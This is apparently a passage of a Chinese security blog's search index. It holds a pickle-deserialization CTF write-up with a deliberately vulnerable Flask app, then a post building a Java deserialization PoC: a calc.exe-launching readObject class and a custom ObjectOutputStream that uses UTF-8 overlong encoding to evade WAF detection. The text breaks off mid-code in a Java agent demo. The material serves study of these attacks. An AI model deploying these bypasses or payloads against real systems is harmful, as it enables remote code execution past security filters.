test/SUCTF2019_guess_game_1 b\u0026#34;cguess_game.Game\\nGame\\np0\\n0cguess_game\\ngame\\np1\\n0g1\\n(N(S\u0026#39;round_count\u0026#39;\\nI10\\ndtbg1\\n(N(S\u0026#39;win_count\u0026#39;\\nI10\\ndtb(I6\\niguess_game.Ticket\\nTicket\\np4\\n0g4\\n.\u0026#34; dis 查看序列化数据操作码\nimport pickletools data=b\u0026#34;\\x80\\x03cbuiltins\\nexec\\nq\\x00X\\x13\\x00\\x00\\x00key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;q\\x01\\x85q\\x02Rq\\x03.\u0026#34; pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL \u0026#39;builtins exec\u0026#39; 17: q BINPUT 0 19: X BINUNICODE \u0026#34;key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;\u0026#34; 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 总结 其实还有好多想表达的，就写道这里吧。\npickle反序列化 利用的理解\n我觉得其实是通过执行python函数到达恶意效果，但本质上不是执行任意python代码（像del操作就不能直接执行），当然可以借助命令函数(exec,eval等)达到执行任意python代码的效果。但是他本质上还是利用执行python函数到达恶意利用\n然后还有点我想说byte那个地方，应该有很多python函数可以代替_codecs.encode的（比如base64），也是自己对python整体了解少的原因吧\n利用 我上面其实只是示例了一个通过flask路由，然后动态修改路由对应方法实现任意文件读取。\n但是其实已经可以达到实现任意函数任意代码修改了(RCE，内存马 都随便操作了)\n其实我本来想写rce的，但是题目把sys.modules['os'] = \u0026quot;not allowed\u0026quot;，得用del sys.modules['os']，然后重新导入os才行（可能还有其他方法，但是我搜到就这个能用）\n然后del属于python 语法操作，不是函数，pickle反序列化不能直接调用，可以借助命令函数来调用，但是这里又把命令函数给过滤了www（我搜到的都过滤了）\n然后其实设置os不可用（这种做法，一般业务也不会这样），我也不太想转这个牛角尖了，所以没用这个做rce这个例子（其实也就是改下函数hhh\n当然有师傅知道上面这个咋搞，欢迎扣我hhh\ntypes.CodeType 利用 这其实是一个很好的点，感谢出题人让我接触到，这种动态修改函数，操作空间挺大的感觉。\n比如：\n只要有变量覆盖这种洞，就可以利用这个点就可以修改函数，然后调用函数达到恶意利用（不过前提还得导入types模块hh\n还有像python原型链污染这种，就是本质也是变量覆盖\n题目源码 突然想到可能有师傅想要hhh\nimport builtins import io import sys import uuid from flask import Flask, request,jsonify,session import pickle import base64 app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = str(uuid.uuid4()).replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;) class User: def __init__(self, username, password, auth=\u0026#39;ctfer\u0026#39;): self.username = username self.password = password self.auth = auth password = str(uuid.uuid4()).replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;) Admin = User(\u0026#39;admin\u0026#39;, password,\u0026#34;admin\u0026#34;) @app.route(\u0026#39;/\u0026#39;) def index(): return \u0026#34;Welcome to my application\u0026#34; @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def post_login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username == \u0026#39;admin\u0026#39; : if password == admin.password: session[\u0026#39;username\u0026#39;] = \u0026#34;admin\u0026#34; return \u0026#34;Welcome Admin\u0026#34; else: return \u0026#34;Invalid Credentials\u0026#34; else: session[\u0026#39;username\u0026#39;] = username return \u0026#39;\u0026#39;\u0026#39; \u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;!-- /src may help you\u0026gt; Username: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt; Password: \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026#39;\u0026#39;\u0026#39; @app.route(\u0026#39;/ppicklee\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def ppicklee(): data = request.form[\u0026#39;data\u0026#39;] sys.modules[\u0026#39;os\u0026#39;] = \u0026#34;not allowed\u0026#34; sys.modules[\u0026#39;sys\u0026#39;] = \u0026#34;not allowed\u0026#34; try: pickle_data = base64.b64decode(data) for i in {\u0026#34;os\u0026#34;, \u0026#34;system\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#39;setstate\u0026#39;, \u0026#34;globals\u0026#34;, \u0026#39;exec\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;template\u0026#39;, \u0026#39;render\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;compile\u0026#39;, \u0026#39;requests\u0026#39;, \u0026#39;exit\u0026#39;, \u0026#39;pickle\u0026#39;,\u0026#34;class\u0026#34;,\u0026#34;mro\u0026#34;,\u0026#34;flask\u0026#34;,\u0026#34;sys\u0026#34;,\u0026#34;base\u0026#34;,\u0026#34;init\u0026#34;,\u0026#34;config\u0026#34;,\u0026#34;session\u0026#34;}: if i.encode() in pickle_data: return i+\u0026#34; waf !!!!!!!\u0026#34; pickle.loads(pickle_data) return \u0026#34;success pickle\u0026#34; except Exception as e: return \u0026#34;fail pickle\u0026#34; @app.route(\u0026#39;/admin\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def admin(): username = session[\u0026#39;username\u0026#39;] if username != \u0026#34;admin\u0026#34;: return jsonify({\u0026#34;message\u0026#34;: \u0026#39;You are not admin!\u0026#39;}) return \u0026#34;Welcome Admin\u0026#34; @app.route(\u0026#39;/src\u0026#39;) def src(): return open(\u0026#34;app.py\u0026#34;, \u0026#34;r\u0026#34;,encoding=\u0026#34;utf-8\u0026#34;).read() if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=False, port=5000) 参考：https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDlhjeP7Ki%3D%3DWhbCCeC84D#toc-4\n","permalink":"https://Jiecub3.github.io/zh/posts/python/pickletypes.codetype%E5%AE%9E%E7%8E%B0%E6%8E%A5%E7%AE%A1%E4%BB%BB%E6%84%8F%E5%87%BD%E6%95%B0/","summary":"参考：https://xz.aliyun.com/t/7436?time__1311=n4%2BxnD0Dy7GQDt%3DG%3DGCDl","title":"pickle\u0026types.CodeType实现接管任意函数"},{"content":"0x01 前言 Java反序列化中应用 @1ue\nUTF-8 Overlong Encoding原理 @p牛\n拜读上面两篇文章后，感觉挺有意思的，跟着1ue师傅的文章再分析了下，这里UTF-8 Overlong Encoding在java中解决了流量的监测的绕过，让明文类名在流量上不再是ascii中的字符，但是反序列化又能解析成正常数据，绕过waf拦截，但是分析完发现加密对应的值是固定的，不过可以2，3byte交叉混洗。\n下文对utf-8在反序列化中的原理进行了解析，然后构造poc并改进poc，实现全字段加密\n0x02 UTF-8 Overlong Encoding原理 这里大概解释下原理，具体也可以看p牛文章\nutf-8编码 参考这个表格，用于将unicode码转换成UTF-8编码：\nFirst code point Last code point Byte 1 Byte 2 Byte 3 Byte 4 U+0000 U+007F 0xxxxxxx U+0080 U+07FF 110xxxxx 10xxxxxx U+0800 U+FFFF 1110xxxx 10xxxxxx 10xxxxxx U+10000 U+10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 及当字符uincode编码超过U+007F时，UTF-8会用多个Byte来代表这个字符(U+0080-U+07FF这个范围就2个Byte，其他范围见上表)\n这种方式看似也没毛病，但是当我们把本身是1Byte字符，按照2Byte的格式（上图）构造会发生什么呢\nP牛用点号.举了个例子，其unicode编码和ascii编码一致，均为0x2E。按照上表，它只能被编码成单字节的UTF-8字符，但我按照下面的方法进行转换：\n0x2E的二进制是10 1110，我给其前面补5个0，变成00000101110 将其分成5位、6位两组：00000，101110 分别给这两组增加前缀110，10，结果是11000000，10101110，对应的是\\xC0\\xAE 0xC0AE并不是一个合法的UTF-8字符，但我们确实是按照UTF-8编码方式将其转换出来的，这就是UTF-8设计中的一个缺陷。\n这个问题在python中已经修复过了，但是java任然存在（我觉得java可以utf-8转化后再进行一次范围判断，1byte是小于127的）\n那我们进入正题，看看UTF-8 Overlong Encoding在java反序列化中的应用，反序列化存在这个问题是因为反序列化和反序列化将字符转换的方式正是上面utf-8到uincode这种模式进行转换的。\n0x03 readObject UTF-8 这里可以跟着1ue师傅文章看\ndemo方便调试\npackage UTF8; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; public class evil implements Serializable { private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); try { Runtime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } } 开始debug，观测readObject是何时拿取className的\n这里1ue师傅给出了调用链\nObjectStreamClass#readNonProxy(ObjectInputStream in) ObjectInputStream#readUTF() BlockDataInputStream#readUTF() ObjectInputStream#readUTFBody(long utflen) ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen) 关键点就在readUTFSpan()，反序列化evil类，打个断点，我们直接看这个函数干了啥\nutflen是获取的类名的长度，然后while执行stop-pos(一般就是utflen)次，来解析类名的每个字符存储到cbuf，最后再添加到sbuf，问题就在解析每个字节的时候\n从注释能一眼发现，是存在UTF-8编码规则的问题，下文结合图片分析问题\nprivate long readUTFSpan(StringBuilder sbuf, long utflen) throws IOException { int cpos = 0; int start = pos; int avail = Math.min(end - pos, CHAR_BUF_SIZE); // stop short of last char unless all of utf bytes in buffer int stop = pos + ((utflen \u0026gt; avail) ? avail - 2 : (int) utflen); boolean outOfBounds = false; try { while (pos \u0026lt; stop) { int b1, b2, b3; b1 = buf[pos++] \u0026amp; 0xFF; switch (b1 \u0026gt;\u0026gt; 4) { case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7: // 1 byte format: 0xxxxxxx cbuf[cpos++] = (char) b1; break; case 12: case 13: // 2 byte format: 110xxxxx 10xxxxxx b2 = buf[pos++]; if ((b2 \u0026amp; 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 \u0026amp; 0x1F) \u0026lt;\u0026lt; 6) | ((b2 \u0026amp; 0x3F) \u0026lt;\u0026lt; 0)); break; case 14: // 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx b3 = buf[pos + 1]; b2 = buf[pos + 0]; pos += 2; if ((b2 \u0026amp; 0xC0) != 0x80 || (b3 \u0026amp; 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 \u0026amp; 0x0F) \u0026lt;\u0026lt; 12) | ((b2 \u0026amp; 0x3F) \u0026lt;\u0026lt; 6) | ((b3 \u0026amp; 0x3F) \u0026lt;\u0026lt; 0)); break; default: // 10xx xxxx, 1111 xxxx throw new UTFDataFormatException(); } } } catch (ArrayIndexOutOfBoundsException ex) { outOfBounds = true; } finally { if (outOfBounds || (pos - start) \u0026gt; utflen) { /* * Fix for 4450867: if a malformed utf char causes the * conversion loop to scan past the expected end of the utf * string, only consume the expected number of utf bytes. */ pos = start + (int) utflen; throw new UTFDataFormatException(); } } sbuf.append(cbuf, 0, cpos); return pos - start; } 这里看到下图，每次while会从buf数据流里取一个字符和0xFF做\u0026amp;运算，然后b1右移动4位，就是b1去掉右边后4位剩下的二进制的10进制在0-7的范围就是属于1byte的，为什么是这个范围呢10000000是128，0xxxxxxx刚好就是(0-127),熟悉ascii就知道这个范围包含正常可打印字符范围(32-126)\n这里还是举个例子吧 eg:\n'a'的二进制是01100001，经过\u0026gt;\u0026gt;4运算后为0110，10进制是6会进入case 6:也就是1byte\n这里很容易发现2byte可能存在问题，我先不讲这个，这里我先想到的是没有case8:啊！！！那ascii 128怎么办\n128 欧元符号 128正式我们的欧元符号€，这里方便分析我直接改了evil类名，发现是可以用的\n生成的文件，我们发现€在java中其实对应3byte，因为他的uincode编码是U+20AC，这里按照上面转换表，这里突然加深了对表中xxx的理解\n这里xxx一共16位，20AC的二进制也是16位，然后填入后生成的3byte就是他的utf-8，（hhh之前没注意这个，刚刚想16位怎么24位的时候看到这个恍然大悟hhh\nU+0800 U+FFFF 1110xxxx 10xxxxxx 10xxxxxx\n20AC的二进制0010000010101100 \u0026ndash;\u0026gt; utf-8: 11100010 10000010 10101100\n及E282AC对应着序列化生成的内容，说明没错，所以不能按照ascii码的思维去想utf-8编码，反序列化中是按照uincode转化为utf-8\n既然都到这了，就简单分析下，3byte他是怎么转化的吧\n3byte 这里对应的是-30，-126，-84这里存储都是补码，及最高位位1时，补码和原码不同，这里这三最高位都是1，所以这里补码显示出来都是负数和原码不同\n这里就是简单分析下代码逻辑，这里识别到第一个字符是1110开头后=case14:,然后这里b3和b2会获取后两位byte，这里pos+0是因为前面获取b1时b1 = buf[pos++] \u0026amp; 0xFF;，pos用的后++所以pos定位符已经向后了一位\nif ((b2 \u0026amp; 0xC0) != 0x80 || (b3 \u0026amp; 0xC0) != 0x80) { 这个是检测 b2 b3是不是以10xx xxxx的格式，C0是1100 0000，跟他做\u0026amp;只有10xx xxxx的格式才会==0x80\n(char) (((b1 \u0026amp; 0x0F) \u0026lt;\u0026lt; 12) |((b2 \u0026amp; 0x3F) \u0026lt;\u0026lt; 6) |((b3 \u0026amp; 0x3F) \u0026lt;\u0026lt; 0)) 然后看到这一段，其实就是恢复€的uincode编码的二进制，这里想成二进制就很好理解了\n这里b1 \u0026amp; 0000 1111 得到就是0000 0010然后向左移动12位 0010 0000 0000 0000 这不是就uincode编码二进制前4位么，然后最后进行or运算，不就是得到完整的uincode编码的二进制么，然后10进制是8364再char转换成字符\nreal 128 但是我们意识到€只是ascii中的128，并不是uincode中的128，及u+0080，跟我们想要分析的东西貌似有点不一样，所以我们直接看看如果是128，java是怎么生成的\n根据getUTFLength()代码我们可以知道128是会走到2byte的\n这里发现会生成两个byte 194 和 130 11000010 10000010都是符合转码规则的，并不会出现我们想象中utf-8 128去转uincode没对应case8：的情况，因为存储为utf-8编码的时候根本不是128，想多了hhh（128utf-8本身就不合法）\n0x04 开始构造 2byte代码逻辑其实都不用看了，跟3byte差不了多少，就是让xxx里面的东西和我们要构造的二进制一样就行了，但是我们一般构造的都是可打印字符，一般只有8位2进制，这里xxx有11位，简单前面填0就好\n这个拿U实验，二进制是0101 0101 填3个0 000 0101 0101，然后按照2byte格式得到 11000001 10010101 及、0xC195\n我们将U替换成2byte，看到下图成功实现\n但是l没加载出来因为2byte要占用两个长度，而utflen还是原来的长度，所以让其+1就好\n其实不难想到既然反序列化是将utf-8转化成uincode，那序列化其实就是将uincode转化成utf-8编码存储的\nwriteUTF 我们简单调试下就能发现writeUTF这个方法是用来转化编码存储的\npublic void writeUTF(String s) throws IOException { writeUTF(s, getUTFLength(s)); } void writeUTF(String s, long utflen) throws IOException { if (utflen \u0026gt; 0xFFFFL) { throw new UTFDataFormatException(); } writeShort((int) utflen); if (utflen == (long) s.length()) { writeBytes(s); } else { writeUTFBody(s); } } 这里我想构造的是2byte的数据，所以这里if (utflen == (long) s.length()) {肯定是false，进入writeUTFBody\nprivate void writeUTFBody(String s) throws IOException { int limit = MAX_BLOCK_SIZE - 3; int len = s.length(); for (int off = 0; off \u0026lt; len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u0026lt; csize; cpos++) { char c = cbuf[cpos]; if (pos \u0026lt;= limit) { if (c \u0026lt;= 0x007F \u0026amp;\u0026amp; c != 0) { buf[pos++] = (byte) c; } else if (c \u0026gt; 0x07FF) { buf[pos + 2] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); buf[pos + 1] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x3F)); buf[pos + 0] = (byte) (0xE0 | ((c \u0026gt;\u0026gt; 12) \u0026amp; 0x0F)); pos += 3; } else { buf[pos + 1] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); buf[pos + 0] = (byte) (0xC0 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x1F)); pos += 2; } } else { // write one byte at a time to normalize block if (c \u0026lt;= 0x007F \u0026amp;\u0026amp; c != 0) { write(c); } else if (c \u0026gt; 0x07FF) { write(0xE0 | ((c \u0026gt;\u0026gt; 12) \u0026amp; 0x0F)); write(0x80 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x3F)); write(0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); } else { write(0xC0 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x1F)); write(0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); } } } off += csize; } } 在这里代码我们很容易就发现是将uincode编码转化成utf-8编码的格式，只是有范围判定，我当时第一反应就是重写这个方法，把这个范围改了，不就能让java帮我们2byte编码了么hh\n还有个点就是长度 通过getUTFLength()返回，也跟范围有关，那把这个也重写不就行啦hh\nlong getUTFLength(String s) { int len = s.length(); long utflen = 0; for (int off = 0; off \u0026lt; len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u0026lt; csize; cpos++) { char c = cbuf[cpos]; if (c \u0026gt;= 0x0001 \u0026amp;\u0026amp; c \u0026lt;= 0x007F) { utflen++; } else if (c \u0026gt; 0x07FF) { utflen += 3; } else { utflen += 2; } } off += csize; } return utflen; } poc构造 其实我们最大的问题就是不能直接重写writeUTFBody方法（这里的时候还不会agent！_!），因为他是private且是ObjectOutputStream的子类\n我们看到writeUTFBody if会判断范围然后进行对应byte的编码，然后注意下这里数据少（\u0026lt;1024）的时候不会执行下方else中write()方法，哪里会进行写入呢，我们根据调用栈往上查找\n见下图，writeClassDescriptor(desc);就是上面执行写入buf的操作。而bout.setBlockDataMode(true);里的drain()函数才是真正写入数据的时候\ndrain() void drain() throws IOException { if (pos == 0) { return; } if (blkmode) { writeBlockHeader(pos); } out.write(buf, 0, pos); pos = 0; } 这里out.write才是真正进行写入操作的地方。\nbuf 还记得我们的问题么，不能直接重写writeUTFBody方法，那能不能设置这个buf值呢？\n反射？其实不行，因为我们要在执行drain()前一刻覆盖这个值，过早会被writeUTFBody会被覆盖，过晚也不行。\n但是天无绝人之路！！我们回想到writeUTFBody中下面一个else里不是有write操作么？这个是什么逻辑呢\nif (pos \u0026lt;= limit) { if (c \u0026lt;= 0x007F \u0026amp;\u0026amp; c != 0) { buf[pos++] = (byte) c; } else if (c \u0026gt; 0x07FF) { buf[pos + 2] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); buf[pos + 1] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x3F)); buf[pos + 0] = (byte) (0xE0 | ((c \u0026gt;\u0026gt; 12) \u0026amp; 0x0F)); pos += 3; } else { buf[pos + 1] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); buf[pos + 0] = (byte) (0xC0 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x1F)); pos += 2; } } else { // write one byte at a time to normalize block if (c \u0026lt;= 0x007F \u0026amp;\u0026amp; c != 0) { write(c); } else if (c \u0026gt; 0x07FF) { write(0xE0 | ((c \u0026gt;\u0026gt; 12) \u0026amp; 0x0F)); write(0x80 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x3F)); write(0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); } else { write(0xC0 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x1F)); write(0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); } } 我们可以看到超过limit会进入到这个else，limit是1204-3，我们看看write干了啥\n可以看到当pos超过MAX_BLOCK_SIZE执行了drain(),就是进行写入，然后pos归0，然后会把(byte) b记录到BlockDataOutputStream.buf中这里不就可以设置buf变量的值了么，但是这个是BlockDataOutputStream类的方法，我们也调不了呀\n但是ObjectOutputStream也有个write可以帮我们调用BlockDataOutputStream的write了hhh\npublic void write(int val) throws IOException { bout.write(val); } 那我们可以直接通过ObjectOutputStream.write来将我们要写入的值记录到BlockDataOutputStream.buf中，然后drain()的时候进行写入。\n心理路程，挺乱的可以不看\n不能直接重写writeUTFBody，但是我们可以重写writeUTF他是ObjectOutputStream方法且是public，然后把writeUTF中需要吊用的方法都可以重新构造成我们的方法（getUTFLength，writeUTFBody）//最开始我以为是重写了后面发现其实不是，刚开始我以为就修改下范围就搞定了，发现其实不是这么事，最初的poc（就是下面poc1把注释取消的代码）并没有进行类名的写入，继续调试了下代码发现writeBytes和writeUTFBody中其实并不会执行真正的write操作，只是把值记录到BlockDataOutputStream.buf变量中，而我poc的类也只是记录到MyObjectOutputStream.buf,而不是BlockDataOutputStream中的buf这也是执行drain()的时候，其实buf里没有值hhh，所以没有写入\npoc1 这里我把2处小于7F的范围改成，c \u0026lt;= 0x0020 \u0026amp;\u0026amp; c != 0，20对应的是32，空白符就1byte的格式，大于32的就采用2byte，实现我们的加密。\npoc中只有writeUTF(String s)是重写，其他都是我们自己构建的这些方法，因为父类没有这些方法，而writeUTF(String s, long utflen)是因为包的原因其实也不是重写。\npackage UTF8; import java.io.IOException; import java.io.ObjectOutputStream; import java.io.OutputStream; import java.io.UTFDataFormatException; public class MyObjectOutputStream extends ObjectOutputStream { private static final int MAX_BLOCK_SIZE = 1024; /** maximum data block header length */ private final char[] cbuf = new char[CHAR_BUF_SIZE]; /** (tunable) length of char buffer (for writing strings) */ private static final int CHAR_BUF_SIZE = 256; private int pos = 0; private final byte[] buf = new byte[MAX_BLOCK_SIZE]; public MyObjectOutputStream(OutputStream out) throws IOException { super(out); } public void writeUTF(String s) throws IOException { writeUTF(s, getUTFLength(s)); } void writeUTF(String s, long utflen) throws IOException { if (utflen \u0026gt; 0xFFFFL) { throw new UTFDataFormatException(); } writeShort((int) utflen); if (utflen == (long) s.length()) { writeBytes(s); } else { writeUTFBody(s); } } private void writeUTFBody(String s) throws IOException { int limit = MAX_BLOCK_SIZE - 3; int len = s.length(); for (int off = 0; off \u0026lt; len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u0026lt; csize; cpos++) { char c = cbuf[cpos]; // if (pos \u0026lt;= limit) { // if (c \u0026lt;= 0x0020 \u0026amp;\u0026amp; c != 0) { // buf[pos++] = (byte) c; // } else if (c \u0026gt; 0x07FF) { // buf[pos + 2] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); // buf[pos + 1] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x3F)); // buf[pos + 0] = (byte) (0xE0 | ((c \u0026gt;\u0026gt; 12) \u0026amp; 0x0F)); // pos += 3; // } else { // buf[pos + 1] = (byte) (0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); // buf[pos + 0] = (byte) (0xC0 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x1F)); // pos += 2; // } // } else { // write one byte at a time to normalize block if (c \u0026lt;= 0x0020 \u0026amp;\u0026amp; c != 0) { write(c); } else if (c \u0026gt; 0x07FF) { write(0xE0 | ((c \u0026gt;\u0026gt; 12) \u0026amp; 0x0F)); write(0x80 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x3F)); write(0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); } else { write(0xC0 | ((c \u0026gt;\u0026gt; 6) \u0026amp; 0x1F)); write(0x80 | ((c \u0026gt;\u0026gt; 0) \u0026amp; 0x3F)); } // } } off += csize; } } long getUTFLength(String s) { int len = s.length(); long utflen = 0; for (int off = 0; off \u0026lt; len; ) { int csize = Math.min(len - off, CHAR_BUF_SIZE); s.getChars(off, off + csize, cbuf, 0); for (int cpos = 0; cpos \u0026lt; csize; cpos++) { char c = cbuf[cpos]; if (c \u0026gt;= 0x0001 \u0026amp;\u0026amp; c \u0026lt;= 0x0020) { utflen++; } else if (c \u0026gt; 0x07FF) { utflen += 3; } else { utflen += 2; } } off += csize; } return utflen; } } package UTF8; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class test { public static void main(String[] args) throws Exception { evil evil = new evil(); FileOutputStream fileOut = new FileOutputStream(\u0026#34;1obj.bin\u0026#34;); MyObjectOutputStream out = new MyObjectOutputStream(fileOut); out.writeObject(evil); out.close(); FileInputStream fileIn = new FileInputStream(\u0026#34;1obj.bin\u0026#34;); ObjectInputStream in = new ObjectInputStream(fileIn); in.readObject(); in.close(); } } 我们可以看到生成数据流已经没有可打印字符了\n�� \u0005sr UTF8.evil����4��\u000e\u0002 xp //这个是正常生成的可以看到明文类名 然后我看了下网上最开始的方案吧\n是设置了一个转换的map，然后将length*2or3，然后直接write的这种形式，现在看感觉可能感觉有点小笨拙hh，但我的poc和这种方式都有一个问题就是都只针对了classname还有属性名和属性值没操作呀！！！我的评价是imperfect\nmap = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#39;.\u0026#39;, new int[]{0xc0, 0xae}); map.put(\u0026#39;;\u0026#39;, new int[]{0xc0, 0xbb}); map.put(\u0026#39;$\u0026#39;, new int[]{0xc0, 0xa4}); map.put(\u0026#39;[\u0026#39;, new int[]{0xc1, 0x9b}); map.put(\u0026#39;]\u0026#39;, new int[]{0xc1, 0x9d}); map.put(\u0026#39;a\u0026#39;, new int[]{0xc1, 0xa1}); map.put(\u0026#39;b\u0026#39;, new int[]{0xc1, 0xa2}); map.put(\u0026#39;c\u0026#39;, new int[]{0xc1, 0xa3}); map.put(\u0026#39;d\u0026#39;, new int[]{0xc1, 0xa4}); map.put(\u0026#39;e\u0026#39;, new int[]{0xc1, 0xa5}); map.put(\u0026#39;f\u0026#39;, new int[]{0xc1, 0xa6}); 可以看到既然还有getRuntime这种字眼！！\n那么就开始我们的perfect之路吧\n调试发现在writeString会对属性进行操作\n但是writeString和writeTypeString都不是public呀，我们不能直接重写。\n要重写writeString的话要到在一个包里面呀，没错我还真这么干了。。。。但是没成功hh\n我们本地生成个package也是java.io，然后在另一个类调用一次我们的MyObjectOutputStream，目的是生成class文件，在target中找到class文件，关闭相关java应用然后找到这个rt.jar包插入我们class，我把java源码放到src.zip中了方便调试\n执行是成功了，生成的东西看着也没啥毛病，但是反序列化的时候出问题了，但是我不想分析这个了，跟我最初的思路背道而驰了\n估计是这个handles的问题，我把这个handles编码相关的都注释了，不然运行不了，因为他也是一个子类的值后面又很麻烦！——！\n看到writeString归根到底，还是调用的writeUTFBody方法，那我都到修改java.io下的包了，为什么不直接修改writeUTFBody里的代码不就行了么？？\n但是我又懒得再操作一篇了hh，因为我看到了这篇文章 用agent操作 ，思路是一样就是修改writeUTFBody的代码，文章中是注释了其他if范围限制，都用3byte的形式生成utf-8编码\n0x05 agent 当然啦对于不会agent的小伙伴来说，会有点困难，笔者这里也不会不然不至于绕那么多圈子，那就在这里突破极限！！\n推荐两篇文章，demo构建起来挺顺利的，也有个大概的理解，这里主要用来修改字节码\n通过 -javaagent 参数指定 agent, 从而在 JVM 启动之前修改 class 内容 (自 JDK 1.5) 通过 VirtualMachine.attach() 方法, 将 agent 附加在启动后的 JVM 进程中, 进而动态修改class内容，然后重新加载这个class (自 JDK 1.6) https://xz.aliyun.com/t/12626?time__1311=GqGxuD2DgAuDlrzY0%3DKqTa%3DeGQnox#toc-0\nhttps://exp10it.io/2023/01/java-agent-%E5%86%85%E5%AD%98%E9%A9%AC/#ide-%E9%85%8D%E7%BD%AE //window跟这篇直接idea构造的demo\n这里就不再叙述了，记录下构建demo的一些细节的地方\n依赖可以直接 在库里面添加java来添加jar 或者pom.xml\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.sun\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.8.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;system\u0026lt;/scope\u0026gt; \u0026lt;systemPath\u0026gt;C:/MyFiles/Tools/ENV/JAVA/jdk1.8.0_74/lib/tools.jar\u0026lt;/systemPath\u0026gt; \u0026lt;/dependency\u0026gt; -javaagent 这里idea点击修改选项，然后添加虚拟机选项，这时会在test类上方多出一行，这个地方填入我们的javaagent\n其中带有 Instrumentation inst 参数的方法优先级更高, 会优先被调用\n这句话的理解，我实验的结果是，两个premain都存在的时候只执行了inst参数的，当只有args参数的premain的时候会输出 on inset\nagentmain 方式 Demo\npackage com.example; import java.lang.instrument.Instrumentation; public class Demo { public static void agentmain(String args, Instrumentation inst) throws Exception { System.out.println(\u0026#34;agentmain\u0026#34;); } } MANIFEST.MF\nManifest-Version: 1.0 Agent-Class: com.example.Demo 然后打包成agent.jar\n另一个idea项目下\ntest用于模拟一直运行的程序\npublic class test { public static void main(String[] args) throws InterruptedException { while (true) { System.out.println(\u0026#34;Hello World\u0026#34;); Thread.sleep(1000); } } } jps找到test对应id\nimport com.sun.tools.attach.*; import java.io.IOException; import java.util.List; public class agent_test { public static void main(String[] args) throws AgentLoadException, IOException, AgentInitializationException, AttachNotSupportedException { VirtualMachine attach = VirtualMachine.attach(\u0026#34;21476\u0026#34;); // 命令行找到这个jvm的进程号 